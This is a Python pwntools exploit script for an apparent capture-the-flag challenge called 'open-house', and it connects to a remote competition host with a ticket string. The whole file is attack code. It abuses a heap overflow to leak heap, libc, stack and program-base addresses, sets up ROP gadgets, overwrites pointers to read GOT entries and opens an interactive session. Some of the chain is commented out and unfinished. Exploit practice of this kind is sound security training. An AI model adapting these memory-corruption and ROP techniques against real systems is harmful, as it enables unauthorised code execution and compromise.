#!/usr/bin/env python3

from pwn import *

e = ELF('./open-house_patched')
libc = ELF('./libc6-i386_2.37-0ubuntu1_amd64.so')

r = 1


if r:
    p = remote("open-house-6dvpeatmylgze.shellweplayaga.me",10001)
    p.sendlineafter(b"please:",b"ticket{AssociationCondo7605n23:Mb-M8mUJrIDYLs_pZKal2mNbEXhp9JVlzPZ0NEppDcl4Hop9}")
else:
    p = e.process()
    #gdb.attach(p)
    pause()

def c(data):
    p.sendlineafter(b"> ",b"c")
    p.sendlineafter(b"!\n",data)

def d(idx): # idx starts at 1 not 0
    p.sendlineafter(b"> ",b"d")
    p.sendlineafter(b"?\n",str(idx).encode())
    return p.recvline()

def m(idx,data):
    p.sendlineafter(b"> ",b"m")
    p.sendlineafter(b"?\n",str(idx).encode())
    p.sendlineafter(b"?\n",data)

def v(x=False, delim=b"AAAA"):
    p.sendlineafter(b"> ",b"v")
    if x:
        p.recvuntil(delim)
        return p.recvline()
    return p.recv()
try:
    c(b"A"*600)
except Exception as e:
    p.interactive()
    exit()
c(b"A"*1)
heap = (u32(v(x=True, delim=b"A"*512).strip()[:4])-0x2860)

for i in range(1,9):
    d(i)
LIBC_PTR = heap + 0x1430

log.success(f"Leaked heap @ {hex(heap)}")

c("B"*8)
c("C"*8)
m(5,b"whoami;" + b"D"*505+p64(LIBC_PTR))
v(x=True,delim=b"whoami;"+b"D"*505)
main_arena = u32(p.recv(50)[7:11])-56
log.success(f"Leaked main_arena @ {hex(main_arena)}")

libc.address = main_arena - 0x22a7c0

c("E"*8)
c("F"*8)
m(7,b"G"*512+p64(libc.address + 0x22AFE0))

v(x=True,delim=b"G"*512)
stack_leak = u32(p.recv(50)[7:11])
log.success(f"Leaked stack addr @ {hex(stack_leak)}")

pie_addr = stack_leak - 0x160
p.sendline(b"")
c("H"*8)
c("I"*8)
m(9,b"J"*512+p64(pie_addr))
v(x=True,delim=b"J"*512)
pie_leak = u32(p.recv(50)[7:11])


base = pie_leak - 0x20FA 
e.address = base

log.success(f"Leaked prog base @ {hex(base)}")
p.sendline(b"")

#potential
#0x338
one_gadget = libc.address + 0x172841
pop_eax = libc.address + 0x0002ed92 #: pop eax ; ret
#pop_edi = libc.address + 0x00021e78 #: pop edi ; ret 
pop_esi = libc.address + 0x00021479 #: pop esi ; ret 
pop_ebx = libc.address + 0x0002c01f #: pop ebx ; ret
pop_ecx_edx = libc.address + 0x00037374 #: pop ecx ; pop edx ; ret
pop_edx = libc.address + 0x0002c01f #: pop ebx ; ret
syscall = libc.address + 0x00037755 #: int 0x80 

ret = base + 0x100e

#m(9,b"K"*512+p64(stack_leak-0xF8))
#pause()


rop_chain = p32(base+0x1022)
rop_chain += p32(base+0x3120)
rop_chain += p32(base + 0x1738)
rop_chain += p32(1)
rop_chain += p32(2)

#rop_chain += p32(base+1022)
#rop_chain += p32(pop_ecx_edx)
#rop_chain += p32(base+0x4044)
#rop_chain += p32(0)
#rop_chain += p32(base+0x404c)
#rop_chain += p32(11)
#rop_chain += p32(syscall)
#rop_chain = p32(pop_esi)
#rop_chain += p32(libc.address + 0x22a000)
#rop_chain += p32(pop_eax)
#rop_chain += p32(0)
#rop_chain += p32(one_gadget)
#v(x=True,delim=b"K"*512)
m(9,b"K"*512+p64(e.got.setvbuf))
log.info(f"sanity check strgot {hex(e.got.setvbuf)}")

leaks = p.recv(50)
strlen_libc = u32(leaks[7:11])
log.success(f"libc ptr: {hex(strlen_libc)}")
#based = u32(leaks[11:15])
#log.success(f"libc ptr: {hex(based)}")
#based2 = u32(leaks[15:19])
#log.success(f"libc ptr: {hex(based2)}")
#base3 = u32(leaks[19:23])
#log.success(f"libc ptr: {hex(based3)}")

#m(10, p32(base + 0x1130))
#c(b"bash")
p.interactive()
